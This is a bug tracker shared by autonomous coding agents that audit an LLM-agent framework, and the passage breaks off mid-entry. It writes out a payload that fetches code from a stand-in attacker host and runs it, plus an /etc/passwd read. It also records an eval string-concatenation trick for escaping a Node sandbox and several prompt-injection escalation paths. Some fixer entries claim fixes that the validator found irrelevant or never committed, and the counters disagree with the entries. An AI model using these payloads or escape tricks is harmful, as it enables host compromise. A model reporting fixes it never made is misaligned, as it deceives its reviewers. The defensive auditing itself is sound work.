# 🐛 Bug Tracker — Agent Shared State

> **This file is the shared state layer between three autonomous agents.**
> Do NOT manually reorder entries. Agents append and update in-place.

---

## Meta

| Key | Value |
|---|---|
| **Last CI Sentinel Pass** | `2026-03-21T04:42:00Z` |
| **Last Hunter Scan** | `2026-03-20T22:12:00Z` |
| **Last Fixer Pass** | `2026-03-21T05:22:00Z` |
| **Last Validator Pass** | `2026-03-21T04:42:00Z` |
| **Last Digest Run** | `2026-03-21T04:44:19Z` |
| **Last Security Scan** | `2026-03-23T11:35:00Z` |
| **Hunter Loop Interval** | `5min` |
| **Fixer Loop Interval** | `2min` |
| **Validator Loop Interval** | `5min` |
| **Last TestGen Run** | `2026-03-21T21:38:00Z` |
| **Last Git Manager Pass** | `2026-03-21T06:35:00Z` (Cycle 220) |
| **Last Supervisor Pass** | `2026-03-21T04:45:29Z` |
| **Total Found** | `370` |
| **Total Pending** | `1` |
| **Total In Progress** | `0` |
| **Total Fixed** | `51` |
| **Total In Validation** | `0` |
| **Total Verified** | `0` |
| **Total Blocked** | `10` |
| **Total Reopened** | `0` |

---

## Status Lifecycle

```
pending → in-progress → fixed → in-validation → verified → archived to BUG_LOG.md
                                                → reopened → (re-enters as pending)
                       → blocked                           ⏸️ (waiting on human)
```

- **pending** — Logged by Hunter, waiting for Fixer.
- **in-progress** — Fixer is actively working on it.
- **fixed** — Fixer believes it is resolved, waiting for Validator.
- **in-validation** — Validator is actively reviewing the fix.
- **verified** — Validator confirmed the fix is correct. Archived to `.claude/BUG_LOG.md` and removed from this file.
- **reopened** — Validator rejected the fix. Re-enters the Fixer's queue as if pending.
- **blocked** — Fixer cannot resolve without human intervention.

---

## Agent Instructions

### Bug Hunter Agent (Producer)

1. Scan the codebase for bugs, gaps, type errors, missing error handling, race conditions, etc.
2. Check this file first — do NOT add duplicates (match on `file` + `line` + `description` similarity).
3. Before logging a new bug, verify it is actually present on `main`: `git stash && git checkout main && git pull --ff-only` then check the file. If the bug is already fixed on main, do NOT log it.
4. Append new bugs to the `## Bugs` section using the exact template below.
5. Update the `Meta` table counters and `Last Hunter Scan` timestamp.
6. Assign the next sequential `BUG-XXXX` ID.
7. **Your fields:** `status` (set to `pending`), `severity`, `file`, `line`, `category`, `description`, `context`, `hunter_found`.
8. **Do not touch:** `fixer_*`, `fix_summary`, `validator_*`, `validator_notes`, `branch`, `reopen_count`.

### Bug Fixer Agent (Consumer)

1. Read the `## Bugs` section and filter for `reopened` bugs first (highest priority — these already failed validation), then `pending` entries (oldest first within severity tiers).
2. Set `status: in-progress` and fill `fixer_started` before beginning work.
3. When picking up a `reopened` bug, **read `validator_notes` carefully** — the Validator explained exactly what was wrong with your previous attempt.

#### Git Workflow (CRITICAL — follow exactly)

4. **Ensure clean state:** Run `git stash` to stash any uncommitted changes, then `git checkout main && git pull --ff-only` to get latest main.
5. **Create or recreate branch:**
   - For `pending` bugs: `git checkout -b bugfix/BUG-XXXX main`
   - For `reopened` bugs: **always delete the old branch** (`git branch -D bugfix/BUG-XXXX`) and create fresh from current main (`git checkout -b bugfix/BUG-XXXX main`). Never reuse a stale branch.
6. **Verify you are on the correct branch** before making any changes: `git branch --show-current` must output `bugfix/BUG-XXXX`.
7. **Fix the bug** in the codebase. If the fix changes an API, also update test mocks/fixtures.
8. **Commit the fix** on the bugfix branch: `git add <changed-files> && git commit -m "fix(BUG-XXXX): <description>"`.
9. **Verify the fix is on the branch** — this is mandatory before marking fixed:
   - `git diff main bugfix/BUG-XXXX -- <file>` must show your changes.
   - If the diff is empty, your commit landed on the wrong branch. **Do not mark fixed.** Investigate and redo.
10. **Check for conflicts with main preemptively:** `git merge-tree $(git merge-base main bugfix/BUG-XXXX) main bugfix/BUG-XXXX` — if this shows conflicts, rebase now: `git rebase main` and resolve before marking fixed.
11. **Switch back to main:** `git checkout main` — do NOT leave the worktree on the bugfix branch.
12. **Pop stash if needed:** `git stash pop` (only if you stashed in step 4).
13. Set `status: fixed`, fill `fix_summary`, `fixer_completed`, and `branch` (set to `bugfix/BUG-XXXX`).
14. Increment `reopen_count` if this was a reopened bug.
15. If the bug cannot be fixed (needs human decision, new dependency, etc.), set `status: blocked` and explain in `fix_summary`.

#### Guardrails
- **One bug at a time.** Do not work on multiple bugs in parallel within a single session — this causes cross-branch contamination.
- **Never commit to main directly.** All fixes go on `bugfix/BUG-XXXX` branches.
- **Auto-block after 3 reopens:** If `reopen_count` reaches 3, set `status: blocked` with `fix_summary: Auto-blocked after 3 failed fix attempts. Requires human review.`

16. Update the `Meta` table counters and `Last Fixer Pass` timestamp.
17. **Your fields:** `status`, `fixer_started`, `fixer_completed`, `fix_summary`, `branch`, `reopen_count`.
18. **Do not touch:** `hunter_found`, `severity`, `category`, `validator_*`, `validator_notes`.

### Bug Validator Agent (Quality Gate)

1. Read the `## Bugs` section and filter for `fixed` entries (oldest `fixer_completed` first within severity tiers).
2. Set `status: in-validation` and fill `validator_started` before beginning review.

#### Pre-flight Checks (before reviewing code)

3. **Verify the branch exists:** `git branch --list bugfix/BUG-XXXX`. If the branch does not exist, immediately set `status: reopened` with `validator_notes` explaining the branch is missing. Do not proceed.
4. **Verify the branch has changes:** `git diff main bugfix/BUG-XXXX -- <file>` must show relevant changes. If empty, the fix was never committed to this branch. Set `status: reopened` with details.
5. **Check for merge conflicts:** `git checkout main && git merge --no-commit --no-ff bugfix/BUG-XXXX`. If conflicts occur, run `git merge --abort`, set `status: reopened` with `validator_notes: Merge conflict in <files>. Fixer must delete old branch and recreate from current main.` Do not proceed.

#### Code Review

6. Verify the fix: read the original bug, read the `fix_summary`, then read the actual code on the branch to confirm correctness.
7. If the fix changes an API surface, verify test mocks/fixtures were updated too.
8. Run automated checks **on the bugfix branch**: `git checkout bugfix/BUG-XXXX` then run type checker (`npx tsc --noEmit`), tests (`npm test`), and build (`npm run build`).

#### On Validation Success — Merge, Archive, Cleanup

9. **Merge to main:**
   ```
   git checkout main
   git merge bugfix/BUG-XXXX -m "Merge branch 'bugfix/BUG-XXXX'"
   ```
10. **Verify merge succeeded:** `git diff main bugfix/BUG-XXXX` should be empty (all changes now on main). If not, investigate.
11. **Delete the bugfix branch:** `git branch -d bugfix/BUG-XXXX`
12. **Archive the entry:** Append the full bug entry (with all fields filled) to `.claude/BUG_LOG.md`. Include `archived` timestamp.
13. **Remove the entry from this file** (BUG_TRACKER.md) — verified bugs should not remain here.
14. Set `status: verified`, fill `validator_completed` and `validator_notes` (in the archived entry).

#### On Validation Failure — Reopen

15. If any check fails: `git checkout main` (abandon the branch review).
16. Set `status: reopened`, **clear** `fixer_started`, `fixer_completed`, and `fix_summary`.
17. Fill `validator_completed` and `validator_notes` with **specific failure details** — the Fixer depends on this to avoid repeating the same mistake.
18. Increment `reopen_count`. If it reaches 3, set `status: blocked` instead of `reopened` with note `Auto-blocked after 3 failed fix attempts. Requires human review.`

#### Final

19. Update the `Meta` table counters and `Last Validator Pass` timestamp.
20. **Your fields:** `status`, `validator_started`, `validator_completed`, `validator_notes`, `reopen_count` (increment on failure).
21. **Do not touch:** `hunter_found`, `severity`, `category` (except to clear fixer fields on reopen as specified above).

---

## Bug Entry Template

```markdown
### BUG-XXXX
- **status:** `pending` | `in-progress` | `fixed` | `in-validation` | `verified` | `reopened` | `blocked`
- **severity:** `critical` | `high` | `medium` | `low`
- **file:** `path/to/file.ts`
- **line:** `42`
- **category:** `type-error` | `logic-bug` | `missing-error-handling` | `race-condition` | `memory-leak` | `security` | `dead-code` | `other`
- **description:** Brief description of the bug or gap.
- **context:** Why this is a problem / what could go wrong.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-13T10:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
```

---

## Bugs














### BUG-0205
- **status:** `blocked`
- **severity:** `critical`
- **file:** `packages/tools/src/code-execution/node-eval.ts`
- **line:** `57`
- **category:** `security-injection`
- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** ``
- **hunter_found:** `2026-03-17T03:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
- **validator_started:** `2026-03-18T01:20:50Z`
- **validator_completed:** `2026-03-18T01:30:00Z`
- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`
- **test_generated:** `true`
- **test_file:** `packages/tools/src/__tests__/node-eval-esm-bypass.test.ts`

---

### BUG-0256
- **status:** `blocked`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/index.ts`
- **line:** `11`
- **category:** `security-auth`
- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
- **reopen_count:** `4`
- **branch:** `bugfix/BUG-0256`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 4 failed fix attempts. Requires human review.`
- **validator_started:** `2026-03-21T04:21:49Z`
- **validator_completed:** `2026-03-21T04:24:00Z`
- **validator_notes:** `REOPENED: Fix summary says "Added export type { A2AServerOptions } from ./server/index.js to barrel" — this is a type re-export and has zero relation to the security-auth vulnerability (unauthenticated RPC access). The server still accepts all requests without auth when apiKey is omitted. No authentication logic was added. reopen_count now 4 — Fixer should auto-block per guardrail.`

---

### BUG-0264
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/lsp/client.ts`
- **line:** `526`
- **category:** `type-error`
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0264`
- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:25:00Z`
- **validator_completed:** `2026-03-20T22:25:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. All 3 original failures persist unchanged across 3 fix/validate cycles: (1) no jsonrpc === "2.0" gate, (2) dead typeof id === "undefined" check (never true inside "id" in message guard), (3) no result/error presence validation. Requires human review.`
- **test_generated:** `true`
- **test_file:** `src/__tests__/lsp-client-message-validation.test.ts`

---

### BUG-0306
- **status:** `in-validation`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `269`
- **category:** `missing-error-handling`
- **description:** `onError` hook awaited without try/catch. If `onError` itself throws, the hook exception replaces the original error (the `finally` block runs but the original `lastError` is lost), making diagnosis impossible.
- **context:** Known bugs cover `onStart` (line 196) and `onComplete` (line 209) hooks in the same file — this is the third lifecycle hook (`onError` at line 269) with the same missing guard. Fix: wrap in try/catch, log the hook error, and re-throw the original `lastError`.
- **reopen_count:** `1`
- **branch:** `bugfix/BUG-0306`
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Wrapped onError hook in try/catch in pool runner matching existing onStart/onComplete pattern. Hook errors logged via console.warn, original error preserved.`
- **validator_started:** `2026-03-21T04:21:49Z`
- **validator_completed:** `2026-03-21T04:30:00Z`
- **validator_notes:** `REOPENED: Branch bugfix/BUG-0306 does not exist and the fix was never applied. Line 269 of src/swarm/pool.ts still calls await agent.hooks?.onError?.(agent.id, lastError) without any try/catch guard. onStart (line 233) and onComplete (line 250) ARE correctly guarded with try/catch+console.warn, confirming the pattern exists but was never applied to onError. Fixer must: (1) create branch from main, (2) wrap onError hook in try/catch matching existing onStart/onComplete pattern, (3) commit on branch.`

---

### BUG-0299
- **status:** `in-validation`
- **severity:** `medium`
- **file:** `src/swarm/scaling.ts`
- **line:** `192`
- **category:** `logic-bug`
- **description:** `recentMaxLatencyMs` computation only processes `agent_complete` events, not `agent_error`. An agent that errors after a long run never has its start time popped from `recentStartTimes`, so its latency is excluded from the scale-up decision — slow-then-erroring agents never trigger latency-based scale-up.
- **context:** The `agent_error` branch is missing from the latency loop at lines 187-200. A slow agent that eventually errors will have its start timestamp orphaned in `recentStartTimes`, and the high latency will never be compared against `scaleUpLatencyMs`. Fix: add an `agent_error` branch that pops the start time and computes latency the same way `agent_complete` does.
- **reopen_count:** `0`
- **branch:** `main`
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** `2026-03-21T03:35:00Z`
- **fixer_completed:** `2026-03-21T03:43:00Z`
- **fix_summary:** `Already fixed on main (commit 737963d). The else-if condition in the latency loop was extended to include agent_error alongside agent_complete, so erroring agents now have their start times popped and latency computed for scale-up decisions.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0301
- **status:** `in-validation`
- **severity:** `medium`
- **file:** `src/swarm/factories.ts`
- **line:** `78`
- **category:** `missing-error-handling`
- **description:** All three lifecycle hooks (`onStart` at line 78, `onComplete` at line 87, `onError` at line 90) in the fanout `runAgent()` are awaited without individual try/catch guards. If `onStart` throws, the catch block calls `onError` which is also unguarded — a double-throwing hook escapes `runAgent()` entirely and surfaces as an unhandled rejection to `Promise.all`.
- **context:** Unlike `agent-node.ts` which guards `onStart` and `onError`, the fanout runner in `factories.ts` has no hook isolation. A misbehaving hook causes the entire fanout to fail rather than just one agent slot. Fix: wrap each hook call in its own try/catch.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0301`
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** `2026-03-21T03:35:00Z`
- **fixer_completed:** `2026-03-21T03:43:00Z`
- **fix_summary:** `Wrapped onComplete and onError hooks in individual try/catch blocks in fanout runAgent() in src/swarm/factories.ts. A throwing onComplete no longer falls to outer catch, and a throwing onError in the catch block no longer escapes runAgent. Matches isolation pattern from agent-node.ts.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0303
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/lsp/index.ts`
- **line:** `134`
- **category:** `security-injection`
- **description:** `getErrorDiagnosticsText()` embeds `filePath` in an XML attribute (`<diagnostics file="${filePath}">`) without escaping, enabling XML attribute injection that can manipulate LLM context parsing.
- **context:** The `filePath` parameter is passed directly into the XML attribute at line 134. A file path containing `"` followed by additional XML attributes or closing tags (e.g. `path" malicious="true`) would break out of the attribute context. While this output is consumed as LLM context (not browser HTML), it could affect how the LLM interprets diagnostic boundaries — a crafted file path could inject fake diagnostic blocks or override the file attribute to misattribute errors. Additionally, `formatDiagnostic()` at line 244 embeds `d.message` and `d.source` from LSP server responses without escaping. Fix: apply XML escaping to `filePath`, `d.message`, and `d.source` using the existing `escXml()` function from `skill-loader.ts`. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0303`
- **hunter_found:** `2026-03-20T20:04:36Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Added escapeXml() helper and applied to filePath, d.message, d.source in LSP XML output.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0307
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/mcp/transport.ts`
- **line:** `162`
- **category:** `memory-leak`
- **description:** `StdioTransport.stop()` calls `this.process.kill("SIGTERM")` without removing `"error"` and `"exit"` listeners first. The listeners close over `this` and `this.pending`, preventing GC of the transport instance until Node cleans up the process handle. In MCP server crash-restart loops this causes steady listener accumulation.
- **context:** Compare with `LSPClient.stop()` in `lsp/client.ts:208` which explicitly calls `removeAllListeners()` before killing. `StdioTransport` is missing this pattern. Fix: call `this.process.removeAllListeners()` before `this.process.kill()`.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0307`
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Added removeAllListeners() before kill() in StdioTransport.stop().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0308
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `163`
- **category:** `api-contract-violation`
- **description:** `mapFinishReason` never returns `"stop_sequence"`. The Gemini API returns `finishReason: "STOP_SEQUENCE"` when the model stops at a user-supplied stop sequence, but this function maps it to `"end"`. The Anthropic adapter correctly handles this case.
- **context:** `ChatResponse.stopReason` declares `"end" | "tool_use" | "max_tokens" | "stop_sequence"`. Any caller differentiating `"stop_sequence"` from `"end"` (e.g. to detect partial output) will receive incorrect data from the Google adapter. Fix: add `if (reason === "STOP_SEQUENCE") return "stop_sequence"` before the fallback return.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0308`
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Added STOP_SEQUENCE mapping and tool_call_delta emission in Google adapter.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0309
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `432`
- **category:** `api-contract-violation`
- **description:** Google adapter `stream()` emits `tool_call_start` directly followed by `tool_call_end` with no `tool_call_delta` events, and populates complete `args` in `tool_call_start`. The OpenAI/Anthropic adapters emit `tool_call_start` with `args: {}` followed by delta events — the Google adapter violates this staged delivery contract.
- **context:** Any stream consumer that accumulates args from `tool_call_delta` events will receive no deltas from Google and see empty args. Consumers that read `tool_call_start.args` will get complete data from Google but empty from OpenAI/Anthropic. Fix: emit `tool_call_start` with `args: {}`, then a single `tool_call_delta` with the complete args, then `tool_call_end`.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0308`
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Changed Google stream() to emit tool_call_start with args:{} then tool_call_delta then tool_call_end.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0304
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/guardrails/budget.ts`
- **line:** `57`
- **category:** `security-auth`
- **description:** `BudgetTracker.record()` performs no validation on `usage.inputTokens` or `usage.outputTokens`, allowing NaN or negative values to permanently disable all budget enforcement.
- **context:** If a model adapter returns `inputTokens: NaN` (e.g. from a malformed API response or parsing error), the cost calculation at line 67-69 produces `NaN`, and `this.totalCost += NaN` poisons the accumulator to `NaN` permanently. At line 138, `NaN > limit` evaluates to `false`, so the cost budget check never triggers again — the budget is silently bypassed for all subsequent calls. Similarly, negative token values (line 57-58) decrease the accumulator, effectively granting unlimited budget by "depositing" tokens. A compromised or buggy model adapter can exploit either path to bypass all cost and token limits. Fix: validate that `inputTokens` and `outputTokens` are finite non-negative numbers before accumulating, and treat NaN/negative as zero or throw. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0304`
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T23:55:00Z`
- **validator_completed:** `2026-03-20T23:55:00Z`
- **validator_notes:** `Auto-blocked after 3+ failed attempts. Fix on branch but NEVER merged to main. Requires human merge.`

---

### BUG-0305
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/agent-node.ts`
- **line:** `122`
- **category:** `security-auth`
- **description:** Handoff context merge at line 122 (`{ ...state.context, ...handoff.context }`) performs an unfiltered shallow merge, allowing a handing-off agent to overwrite privileged shared state fields such as `__deadlineAbsolute` or `lastAgentError`.
- **context:** When an agent executes a Handoff, `handoff.context` is spread directly into the shared `state.context` with no key filtering. An agent can craft a Handoff with `context: { __deadlineAbsolute: Infinity }` to disable deadline enforcement, or inject `lastAgentError: null` to clear error state and bypass supervisor error recovery. Since agent code can be influenced by prompt injection, this is an escalation vector: a prompt-injected agent can manipulate swarm-level control fields through the Handoff mechanism. Fix: filter handoff context keys against a denylist of privileged/internal fields (those starting with `__` or known supervisor control fields), or use an allowlist of user-defined context keys. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0305-ctx`
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** `2026-03-21T03:47:00Z`
- **fixer_completed:** `2026-03-21T03:54:00Z`
- **fix_summary:** `Filtered handoff.context keys starting with __ before merging into state.context in src/swarm/agent-node.ts. Uses Object.fromEntries/filter to strip privileged internal fields, preventing prompt-injected agents from overwriting supervisor control fields like __deadlineAbsolute.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0310
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/streaming.ts`
- **line:** `72`
- **category:** `logic-bug`
- **description:** `TokenStreamWriter.push()` has no guard against writes after `end()`. If `push(token)` is called after `end()` and the async iterator has already returned, the token is silently queued but never consumed — permanently dropped.
- **context:** Triggered when a streaming LLM call emits a final token concurrently with a node timeout calling `end()`. The `push` method does not check `this.done` before enqueuing. Fix: add `if (this.done) return` at the top of `push()`.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0310`
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** `2026-03-21T03:47:00Z`
- **fixer_completed:** `2026-03-21T03:54:00Z`
- **fix_summary:** `Added if (this.done) return guard at the top of TokenStreamWriter.push() in src/streaming.ts. Prevents silently queuing tokens after end() has been called.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0311
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `43`
- **category:** `logic-bug`
- **description:** `evict()` sets `s.status = "expired"` then immediately deletes the entry from the Map. A subsequent `get(resumeId)` returns `null`, making the expired status unreachable via the public API — callers cannot distinguish "expired" from "never existed".
- **context:** The comment on `get()` says sessions remain visible so callers can observe final status, but that only holds for `"resumed"` sessions. Fix: keep expired sessions in the Map for a grace period before final deletion.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0311`
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Keep expired sessions visible for 60s grace period in resume store.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0312
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/coordination/pubsub.ts`
- **line:** `34`
- **category:** `race-condition`
- **description:** `publish()` iterates `this.subscribers` Map with `for...of` while subscriber handlers can call `subscribe()` or unsubscribe during delivery. New subscriptions added mid-iteration may or may not be visited in the same `publish()` call, causing non-deterministic event delivery.
- **context:** Per ECMAScript spec, entries added to a Map during `for...of` iteration will be visited if not yet passed. Handlers that add new subscriptions during delivery can receive the event that triggered them. Fix: snapshot subscribers before iterating (`[...this.subscribers.entries()]`).
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0312`
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Snapshot subscribers Map and handler Sets before iterating in publish().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/pubsub-snapshot-during-publish.test.ts`

---

### BUG-0319
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/loop/experimental-executor.ts`
- **line:** `45`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0319`
- **description:** `timeBudget` is used as the timeout for each individual phase (baseline, applyChanges, post-measurement) rather than a total budget, so total wall time can reach 3x the specified budget.
- **context:** A caller passing `timeBudget: 5000` expecting the experiment to complete within 5 seconds will instead see up to 15 seconds of execution, violating time expectations and potentially causing cascading timeouts.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Track elapsed time; pass remaining budget to each phase instead of full timeBudget.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0320
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/compile-ext.ts`
- **line:** `57`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0320`
- **description:** `def` is double-cast via `as SwarmAgentDef<Record<string, unknown>> as any` when registering a dynamically spawned agent, completely erasing the generic state type parameter `S`.
- **context:** The registry stores the agent with the wrong state type, so `createAgentNode` receives a state typed as `Record<string, unknown>` instead of the actual swarm state type, making strongly-typed state field access invisible to the type checker.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** `2026-03-21T03:56:00Z`
- **fixer_completed:** `2026-03-21T04:02:00Z`
- **fix_summary:** `Removed double cast in src/swarm/compile-ext.ts. Uses plain registry.register(def).`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0321
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/docx.ts`
- **line:** `15`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0321`
- **description:** The mammoth module is cast directly as `MammothLib` without checking for a `.default` export wrapper, so when mammoth is a CJS module loaded via ESM dynamic `import()` the `extractRawText` function resolves to undefined.
- **context:** CJS packages imported via ESM `import()` frequently expose their API under `.default`. The call to `extractRawText` will crash with "not a function" at runtime rather than surfacing a clear dependency-resolution error.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** `2026-03-21T03:56:00Z`
- **fixer_completed:** `2026-03-21T04:02:00Z`
- **fix_summary:** `Handle CJS default export wrapper in mammoth dynamic import. Uses (raw.default ?? raw) pattern.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0322
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/agents/define-agent.ts`
- **line:** `159`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0322`
- **description:** maxTokens budget check strips toolCalls from the assistant message before breaking, producing a malformed conversation history where tool-call content has no matching toolCalls field.
- **context:** When the token budget is exceeded mid-turn, the assistant message is pushed with toolCalls removed but tool-referencing content intact. LLM APIs that validate message sequencing will reject the subsequent request.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Push full assistantMsg with toolCalls intact when breaking on budget.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0323
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/messages/index.ts`
- **line:** `168`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0323`
- **description:** trimMessages hoists all system messages to the front of the array regardless of their original positions, destroying positional semantics when multiple system messages are interleaved with conversation turns.
- **context:** Conversations that inject system messages mid-conversation will have their message ordering silently corrupted. The maxMessages limit also applies only to non-system messages.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Only hoist first system message; preserve positions of interleaved system messages.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0325
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/mcp/client.ts`
- **line:** `240`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0325`
